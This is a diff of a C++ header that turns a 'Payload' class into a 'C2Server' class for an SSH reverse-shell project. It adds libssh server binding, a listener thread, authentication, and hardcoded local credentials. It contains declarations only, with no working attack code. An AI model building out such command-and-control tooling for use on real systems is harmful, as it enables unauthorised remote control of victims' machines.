@@ -2,35 +2,45 @@
 // Created by rip on 6/30/19.
 //
 
-#ifndef SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
-#define SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
+#ifndef SSH_TCP_REVERSE_SHELL_CPP_C2SERVER_H
+#define SSH_TCP_REVERSE_SHELL_CPP_C2SERVER_H
 
 #include <iostream>
+#include <thread>
 #include "libssh/libssh.h"
+#include "libssh/server.h"
 
-class Payload {
+#define KEYS_FOLDER "/Users/rip/.ssh/"
+
+
+class C2Server {
 
 private:
+    ssh_bind bind;
     ssh_session session;
     ssh_channel channel;
     const std::string host { "127.0.0.1" };
     const int port { 4433 };
     const std::string user { "c2user" };
     const std::string pwd { "12345" };
+    bool isListening { false };
+    std::thread listenerThread;
 
+    void listen();
     void handleConnection();
     void tearDown();
+    bool authenticate();
     bool openChannel();
     void sendMsg(const std::string&);
     std::string rcvMsg();
 
 public:
-    Payload();
-    ~Payload();
+    C2Server();
+    ~C2Server();
 
-    void connect();
-
+    void start();
+    void stop();
 };
 
 
-#endif //SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_H
+#endif //SSH_TCP_REVERSE_SHELL_CPP_C2_H
